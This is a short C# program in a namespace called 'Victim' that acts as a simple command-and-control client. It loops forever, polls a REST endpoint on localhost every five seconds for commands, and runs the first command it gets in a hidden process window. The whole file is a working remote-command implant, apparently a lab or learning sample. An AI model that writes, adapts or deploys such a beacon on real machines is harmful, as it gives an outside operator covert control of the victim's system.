using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RestSharp;

namespace Victim
{
    public class Program
    {
        public static void Main(string[] args)
        {
            var client = new RestClient();
            client.BaseUrl = new Uri("http://localhost:5000/api");

            while (true)
            {               
                // creat request
                var request = new RestRequest();
                request.Resource = "command/1";

                // execute request
                var response = client.Get(request);

                // convert response body
                var commands = JsonConvert.DeserializeObject<List<Command>>(response.Content);

                // execute command
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                startInfo.FileName = commands.First().Executable;
                startInfo.Arguments = $"/C {commands.First().Parameters}";

                process.StartInfo = startInfo;
                process.Start();

                // wait before request again.
                Thread.Sleep(5000);
            }
        }
    }
}
